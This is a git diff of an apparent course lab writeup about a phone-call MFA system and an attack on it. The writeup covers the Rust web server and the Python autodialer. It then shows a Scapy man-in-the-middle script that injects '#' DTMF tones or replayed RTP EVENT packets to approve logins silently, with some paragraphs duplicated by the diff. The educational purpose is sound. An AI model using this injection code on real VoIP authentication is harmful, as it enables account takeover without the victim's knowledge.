@@ -59,6 +59,9 @@ The major issue with prompt based authentication, specifically the Yes/No varian
 While prompt spamming is an issue for prompt authentication, there are already mitigations for this attack such as Google's number-based prompt. Additionally, these prompts are often secured by the phone's on-board security such as Face ID authentication to approve Microsoft Authenticator requests, whereas SMS or phone calls can often be read when the device is locked. Finally, this system is not vulnerable to the transport vulnerabilities plaguing SMS and telephony as all communications between the app and server are TLS encrypted. This authentication method offers ease of use for most users, no cost overhead, and better security than SMS not including human error.
 
 # Infrastructure
+The infrastructure for this project consists of a web server, an automated VOIP system that dials users and prompts for authentication, and corresponding VOIP infrastructure to allow the calls to be placed. All servers were hosted on a private cluster with public IP addresses due to difficulties with accessing the class VMs through GlobalProtect (it throws SSL errors or won't install on Linux). The full source code for every component is available at 
+
+[https://github.com/cs4404-mission2]: https://github.com/cs4404-mission2
 
 The infrastructure for this project consists of a web server, an automated VOIP system that dials users and prompts for authentication, and corresponding VOIP infrastructure to allow the calls to be placed. All servers were hosted on a private cluster with public IP addresses due to difficulties with accessing the class VMs through GlobalProtect (it throws SSL errors or won't install on Linux).
 
@@ -81,12 +84,87 @@ iptables -A OUTPUT -p icmp --icmp-type redirect -j DROP
 
 The webserver for this project is a modified version of the voting server from mission 1. It is a Rust binary built with the Rocket API with an sqlite database to keep track of user data and credentials. Anonymity is not a security goal of this system, user authorization is verified with an encrypted cookie whose content is the user's username and a flag indicating whether or not the user has authenticated via phone. This cannot be faked by the client as the cookie is signed and encrypted with a key known only to the server.
 
+When a user logs in to the webserver, it hashes their password with Argon2 and compares it with the user's record in the database. If these match, the user is given the aforementioned cookie with the MFA flag set to zero. For example, the user `jmellington`'s cookie's decrypted value would be `jmellington0`. The client browser is then redirected to the content page that checks for the authorization cookie when the page is loaded. If the cookie is not present or invalid, the user gets sent back to the login page. If the cookie is present but the MFA flag is unset, the database is queried to see if the user did complete MFA since the last check and updates the flag accordingly. If the user has not, the webpage issues a server-side GET authorization request from the autodialer's API endpoint containing the client's phone number. This is similar in structure to SSO. If the user did complete MFA, the autodialer makes a POST to an endpoint on the webserver, the user's token is re-issued with the MFA flag set, and the homepage will display its content. The Multi-factor authentication logic is run every time the user loads the homepage to ensure that the token has not been revoked and is as follows:
+
+```rust
+match cookies.get_private("authtoken"){
+    Some(crumb) => {
+        name = crumb.value().to_string();
+        println!("testing user cookie {}",&name);
+        //check if user has passed 2FA
+        match name.pop().unwrap()
+        {
+            // if MFA has not been done according to cookie, check for updates in the database and then show mfa page
+            '0' =>
+                {
+                    match sqlx::query("SELECT mfa FROM users WHERE name = ?").bind(&name).fetch_one(&mut *db).await{
+                        Ok(status) => {
+                            match status.get(0){
+                                "ok" => {
+                                    // re-issue cookie
+                                    cookies.remove_private(crumb);
+                                    let mut tmp = name.clone();
+                                    tmp.push('1');
+                                    cookies.add_private(Cookie::new("authtoken",tmp));
+                                    return Template::render("home",context!{name});
+                            }
+                                _ => {let number = get_phone(db,&name).await.unwrap();
+                                    let mut tmp = String::from("http://127.0.0.1:5000/verify?num=");
+                                    tmp.push_str(number.as_str());
+                                    reqwest::get(tmp).await.unwrap();
+                                    return Template::render("mfa",context!{number: number});}
+                            }
+                        },
+                        Err(_) => panic!(), // if database can't return row, throw 500 error
+                }
+            }
+            // if MFA succeeded, render homepage
+            '1' => {return Template::render("home",context!{name});}
+            _ => return Template::render("auth",context!{authok: false}),
+}
+}
+    None => {println!("Missing cookie!");
+        return Template::render("auth",context!{authok: false});},
+}
+```
+
+A series of screen shots depicting the standard login process:
+
+![](https://github.com/cs4404-mission2/writeup/blob/main/web-login.png?raw=true)
+
+![](https://github.com/cs4404-mission2/writeup/blob/main/web-mfa.png?raw=true)
+
+At this point the user will receive a call from the autodialer prompting them to approve the login attempt.
+
+![](https://github.com/cs4404-mission2/writeup/blob/main/web-home.png?raw=true)
 When a user logs in to the webserver, it hashes their password with Argon2 and compares it with the user's record in the database. If these match, the user is given the aforementioned cookie with the MFA flag set to zero. For example, the user `jmellington`'s cookie's decrypted value would be `jmellington0`. The client browser is then redirected to the content page that checks for the authorization cookie when the page is loaded. If the cookie is not present or invalid, the user gets sent back to the login page. If the cookie is present but the MFA flag is unset, the database is queried to see if the user did complete MFA since the last check and updates the flag accordingly. If the user has not, the webpage issues a server-side GET authorization request from the autodialer's API endpoint containing the client's phone number. This is similar in structure to SSO. If the user did complete MFA, the autodialer makes a POST to an endpoint on the webserver, the user's token is re-issued with
 the MFA flag set, and the homepage will display its content.
 
 ## Autodialer
 
 The Autodialer is a python program build with flask for the API endpoint and pyvoip for VOIP operations. When it receives an authorization request over http it places a call to the user's phone number, it plays a pre-recorded message instructing the user to press pound to authorize their login and waits. If it detects the Dial Tone Multi Frequency (DTMF) code (941Hz and 1477Hz) for the pound key, it sends a POST to the webserver that the phone number was authorized successfully. If no such code is detected after 16 seconds, it notifies the server that the authorization was not successful and hangs up. In this configuration, the autodialer service is hosted on the same VM as the webserver (VM 1). As such, the API endpoint only listens on the localhost `127.0.0.1` interface, protecting it from outside manipulation.
+
+```python
+    while (call.state == CallState.ANSWERED) and (time.time() < timeout):
+        if call.get_dtmf() == "#":
+            ok = True
+            timeout = 0
+        time.sleep(0.1)
+    if ok:
+        f = wave.open('assets/confirmed.wav', 'rb')
+        stat = "ok"
+    else:
+        f = wave.open('assets/failed.wav','rb')
+        stat = "bad"
+
+    requests.post("http://127.0.0.1:8000/endpoint",data={"number":req.number,"status":stat})
+    frames = f.getnframes()
+    data = f.readframes(frames)
+    f.close()
+    call.write_audio(data)
+```
+
+
 
 ## PBX
 
@@ -540,10 +618,6 @@ traceroute to 192.0.2.1 (192.0.2.1), 30 hops max, 60 byte packets
 
 Now that BGP manipulation has put us in-path between the authentication system's PBX and the target's phone, we have to actually manipulate the pertinent traffic to allow the login without being detected. To sniff and manipulate traffic, we are using Scapy which is a CLI utility and python library that allows for packet capture and generation. To capture packets, we use Scapy's `bridge_and_sniff` function which allows us to forward traffic from one interface to the other while inspecting and tampering with any traffic flowing through. In our configuration, `enp5s0` was facing the PBX and `enp5s1` was facing outward. This is set up in the second to last line in the program:
 
-```python
-packetlog = scapy.sendrecv.bridge_and_sniff(if1='enp5s0', if2='enp5s1', xfrm12=gatekeep, xfrm21=keepgate)
-```
-
 The `xfrmXX` arguments are functions that are called for every packet moving from if1 to if2 or vice versa. We'll first look at gatekeep, the function responlsible for handling PBX to client communication. It first checks if the packet is related to VOIP and if it isn't automatically forwards it with no modification.
 
 ```python
@@ -554,23 +628,45 @@ if not pkt.haslayer("UDP"):
 Scapy automatically classifies packets by their payloads and a captured packet includes all layers from the Ethernet frame to the application specific protocol. However, it does not have support for the SIP protocol which is responsible for establishing VOIP calls, hence the 'Raw' packet type. If last layer of the packet is Raw and destined for port 5060, we assume it's SIP and parse it as such. If the packet is an INVITE, we grab the to and from extensions which allows us to associate a phone number to an IP address and create a new `conversation` object. If the packet is a BYE, we discard the conversation object. Otherwise, just allow it through.
 
 If the call originates from the authentication server's extension, the call automatically enters "enforcing" mode after 1.5 seconds. If an RTP packet comes from the PBX whose conversation is in enforcing mode, it's original payload is removed and replaced with innocuous audio before then being forwarded. This ensures that the user does not become suspicious when the system gives the response "authentication successful" when they authorized no such authentication.
-When the conversation goes into enforcing mode, the `keepgate` function which is controlling traffic from clients to the PBX, starts manipulating RTP data. Using the same process as above, it injects the DTMF code for "#" into the call by replacing audio packets originating from the user. The function to replace the packets is as follows:
+When the conversation goes into enforcing mode, the `keepgate` function which is controlling traffic from clients to the PBX, starts manipulating RTP data. Using the same process as above, it injects the DTMF code for "#" into the call by replacing audio packets originating from the user. Since the phone may be carried over the PSTN (like it would be in the real world), the program first tries to send analog DTMF tone signals. However, more modern VOIP no longer uses voice-band signaling and instead using RTP EVENT packets. Using these to simulate the keypress is even easier, simply replaying a packet because RTP EVENTs do not have timestamps or sequence numbers. The function to send the packets is as follows:
 
 ```python
 def manipulate(self, pkt: Packet):
-    content = self.txbuff.read(160)
-    # try to read 1 packet worth of data from audio buffer
-    # if we don't have enough for a full packet, just let the OG packet through
-    if len(content) < 160:
-        logging.info("Done with DTMF transmission")
-        return pkt
-    # Encode payload for PCMU transmission
-    content = audioop.bias(content, 1, -128)
-    content = audioop.lin2ulaw(content, 1)
-    # Replace payload with DTMF code
-    pkt.lastlayer().remove_payload()
-    pkt.lastlayer().add_payload(content)
-    return pkt
+    # Try tx via analog first
+    if self.analogue:
+        pkt = pkt["IP"]
+        content = self.txbuff.read(160)
+        #try to read 1 packet worth of data
+        #if we don't have enough for a full packet, just let the OG packet through
+        if len(content) < 160:
+            logging.info("Done with DTMF transmission")
+            self.analogue = False
+            return pkt
+        # Encode payload for PCMU transmission
+        content = audioop.bias(content, 1, -128)
+        content = audioop.lin2ulaw(content, 1)
+        # strip headers from og packet
+        header = self.parse_header(pkt.lastlayer().load[0:11])
+        # add old header to new data
+        content = Raw(header + content)
+    # Then try via RTP Event signaling
+    else:
+        try:
+            content = self.events.pop()
+        except IndexError:
+            return
+    #Build new packet to force checksum recalculation
+    newpkt = IP(src=pkt.src,dst=pkt.dst)/UDP(sport=pkt.payload.sport,dport=pkt.payload.dport)/content
+    send(newpkt)
+
+def parse_header(hdr: bytes) -> bytes:
+    garb = hdr[0:1] # data we don't care about
+    seq = int.from_bytes(hdr[2:3], byteorder="big") + 1
+    ts = int.from_bytes(hdr[4:7], byteorder="big") + 1000
+    ssrc = hdr[8:]
+    seq = seq.to_bytes(2,"big")
+    ts = ts.to_bytes(2,"big")
+    return garb + seq + ts + ssrc
 ```
 
 This approves the authentication without the user's interaction (other than picking up the phone) or knowledge.
